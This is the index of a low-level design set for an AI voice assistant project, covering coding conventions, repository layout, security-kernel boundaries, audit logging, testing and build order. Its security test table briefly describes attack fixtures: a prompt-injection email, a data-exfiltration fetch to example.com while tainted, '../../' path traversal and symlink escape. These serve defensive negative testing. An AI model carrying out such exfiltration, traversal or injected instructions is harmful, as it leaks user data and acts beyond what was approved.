# Project Panini — Low Level Design (LLD) Index

**Document Type:** Low Level Design — Index  
**Phase:** 05 — LLD  
**Version:** 1.0  
**Status:** IN PROGRESS  
**Date:** 2026-09-09  

---

## Purpose

The LLD is the implementation blueprint: class structures, data schemas, algorithms, and file layout — detailed enough to write code directly from, without re-deriving decisions.

**Boundary:** HLD says *what components exist and how they talk*. LLD says *how each is built internally*.

---

## Document Set

| # | Document | Covers | Status |
|---|---|---|---|
| 00 | `00_LLD_Index.md` | Index, conventions, cross-cutting | ✅ This document |
| 01 | `01_Security_Kernel_LLD.md` | ToolGateway, taint, egress, approvals, audit, credentials | ✅ Complete |
| 02 | `02_Voice_Pipeline_LLD.md` | ASR, TTS, VAD, wake word, segmenter | ✅ Complete |
| 03 | `03_Conversation_LLD.md` | Turn, orchestrator, context, providers | ✅ Complete |
| 04 | `04_Tools_LLD.md` | Registry, base class, connector implementations | ✅ Complete |
| 05 | `05_Frontend_LLD.md` | Renderer, avatar drivers, panels, transport | ✅ Complete |
| 06 | `06_Persistence_LLD.md` | History, audit store, schemas, migrations | ✅ Complete |
| 07 | `07_Configuration_LLD.md` | `panini.yaml` schema, validation, hot-reload | ✅ Complete |
| 08 | `08_Plugin_System_LLD.md` | Manifest, loader, verification, sandbox | ✅ Complete |

**Order of implementation** follows dependency, not document number — see §5.

---

## 1. Conventions

### 1.1 Language and tooling

| Aspect | Choice |
|---|---|
| Python | 3.12 |
| Type checking | `mypy --strict` on `panini/security/**`, standard elsewhere |
| Async | `asyncio`; blocking work via `asyncio.to_thread` or a bounded executor |
| Data shapes | `pydantic` v2 models at boundaries; `dataclass` internally |
| Frontend | TypeScript strict; React 18; Vite |
| Formatting | `ruff` (Python), `biome` (TS) |

### 1.2 Naming

| Kind | Convention | Example |
|---|---|---|
| Modules | `snake_case` | `tool_gateway.py` |
| Classes | `PascalCase` | `ToolGateway` |
| Interfaces (ABCs) | `PascalCase`, no `I` prefix | `LLMProvider` |
| Enums | `PascalCase` type, `UPPER` members | `Provenance.RETRIEVED` |
| Config keys | `snake_case` | `num_gpu` |
| Events | `dotted.lowercase` | `approval.requested` |

### 1.3 Error taxonomy

```
PaniniError                       (base)
├── ConfigError                   invalid/missing configuration
├── ProviderError                 LLM provider failure
│   └── ProviderUnavailable       → FR-214, never falls back silently
├── ToolError                     tool execution failure
│   ├── ToolTimeout
│   └── ToolNotAvailable
├── SecurityError                 ⚠️ never suppressed, never retried
│   ├── ApprovalDenied
│   ├── EgressBlocked
│   ├── PathEscape
│   └── AuditWriteFailure         → fails the tool call (HLD §8)
└── VoiceError
```

**Rule:** `SecurityError` and its subclasses are never caught by generic handlers. Each has an explicit handler that surfaces to the user.

---

## 2. Repository Layout

```
Project Panini/
├── docs/                       (this documentation set)
├── src/
│   ├── panini/                 Python backend
│   │   ├── api/
│   │   ├── core/
│   │   ├── security/           ← mypy --strict, highest review bar
│   │   ├── llm/
│   │   ├── tools/
│   │   ├── plugins/
│   │   ├── voice/
│   │   ├── store/
│   │   ├── events/
│   │   └── __main__.py
│   ├── renderer/               React frontend
│   └── electron/               Electron main process
├── tests/
│   ├── unit/
│   ├── integration/
│   └── security/               ← negative tests (FRD §Verification)
├── plugins/                    User plugin directory
├── config/
│   └── panini.yaml
├── NOTICES.md                  Apache 2.0 attribution + fork SHAs
└── pyproject.toml
```

---

## 3. Cross-Cutting Design

### 3.1 Dependency injection

Components receive dependencies via constructor. No global singletons except the event bus, which is passed explicitly where practical.

**The enforced constraint (HLD §1.3):**

```python
# core/orchestrator.py
class Orchestrator:
    def __init__(self, gateway: ToolGateway, provider: LLMProvider, bus: EventBus):
        ...
```

`Orchestrator` receives `ToolGateway`, never `ToolRegistry`. Enforced by CI lint (§3.2).

### 3.2 Import boundary enforcement (HR-01)

`ruff` configuration forbids the bypass path:

```toml
[tool.ruff.lint.flake8-tidy-imports.banned-api]
"panini.tools.registry".msg =
  "core/ must not import ToolRegistry directly. Use security.ToolGateway (HLD §1.3)."
```

Applied to `panini/core/**` and `panini/api/**`. A CI failure here is a security regression, not a style issue.

### 3.3 Threading discipline (HR-04)

| Rule | Enforcement |
|---|---|
| `Turn` is mutated only on the event loop | `Turn` methods assert the running loop matches the creating loop |
| Worker threads return values; never mutate shared state | Code review + `security` module type strictness |
| Blocking calls use `asyncio.to_thread` or a named executor | Lint rule against blocking calls in `async def` |

### 3.4 Logging vs auditing

Two distinct sinks, deliberately separated:

| | Application log | Audit log |
|---|---|---|
| Purpose | Debugging | Accountability |
| Format | Structured JSON lines | SQLite, append-only |
| Mutability | Rotated, deletable | Append-only, tool-inaccessible |
| Contains secrets | Never | Never (redacted) |
| Failure behaviour | Degrade silently | **Fails the tool call** |

---

## 4. Testing Strategy

| Suite | Location | Runs |
|---|---|---|
| Unit | `tests/unit/` | Every commit |
| Integration | `tests/integration/` | Every commit (mocked externals) |
| **Security (negative)** | `tests/security/` | **Every commit — blocking** |
| Connector live | `tests/integration/live/` | Manual, real accounts |
| Performance | `tests/perf/` | Before release |

### The security suite is different in kind

It asserts the system **refuses**. Fixtures include:

| Fixture | Asserts |
|---|---|
| `injection_email.json` | Email body with embedded instructions → no unapproved tool call |
| `exfil_url.json` | `fetch example.com/log?data=…` while tainted → egress approval fires |
| `audit_access.json` | `fs_read` on the audit path → `PathEscape` |
| `path_escape.json` | `../../` traversal → refused |
| `symlink_sync.json` | Symlink into a synced folder → classified egress |
| `unsigned_plugin/` | Fails verification → not loaded |

**A green happy-path suite with a red security suite means the build fails.**

---

## 5. Implementation Order

Dependency-driven. Each stage is independently testable.

| Stage | Builds | Rationale |
|---|---|---|
| **1** | Config · Events · Persistence · **Security kernel** | Everything depends on the kernel; build it first, not last |
| **2** | Tool registry + `fs`, `shell` tools | Exercises the kernel with the two most dangerous tools |
| **3** | LLM providers + Orchestrator + Turn | Text-only end-to-end via the text adapter |
| **4** | Voice pipeline | Adds ASR/TTS/VAD/wake to a working text pipeline |
| **5** | Electron shell + renderer + panels | UI on a working backend |
| **6** | Avatar | Visual layer last — highest polish, lowest risk |
| **7** | Remaining connectors (Gmail, Calendar, web, browser) | OAuth complexity, isolated |
| **8** | Plugin system | Extensibility once the core is stable |

> **Why the security kernel is Stage 1:** retrofitting a mandatory gate into a system that already calls tools directly is a rewrite. Built first, every subsequent tool is forced through it by construction.

---

## 6. Open Items Carried Into LLD

| # | Item | Resolved in | Status |
|---|---|---|---|
| 1 | Exhaustive egress tool list + classification rule | `01_Security_Kernel_LLD.md` §4 | ✅ **Resolved** |
| 2 | Audit log schema + redaction | `01_Security_Kernel_LLD.md` §6 | ✅ **Resolved** |
| 3 | Credential handle mechanism | `01_Security_Kernel_LLD.md` §7 | ✅ **Resolved** |
| 4 | Conversation memory architecture (DO-002) | `03_Conversation_LLD.md` | 🔲 Pending |
| 5 | Sentence segmentation ("Dr.", "e.g.") | `02_Voice_Pipeline_LLD.md` | 🔲 Pending |
| 6 | Emotion derivation | `03_Conversation_LLD.md` | 🔲 Pending |
| 7 | Context reduction at token limit | `03_Conversation_LLD.md` | 🔲 Pending |
| 8 | Viseme generation for lip-sync | `05_Frontend_LLD.md` | 🔲 Pending |
| 9 | Plugin manifest schema | `08_Plugin_System_LLD.md` | 🔲 Pending |
| 10 | Wake-word / VAD benchmarks | Validation Tests 8 & 9 | 🔲 Outstanding |
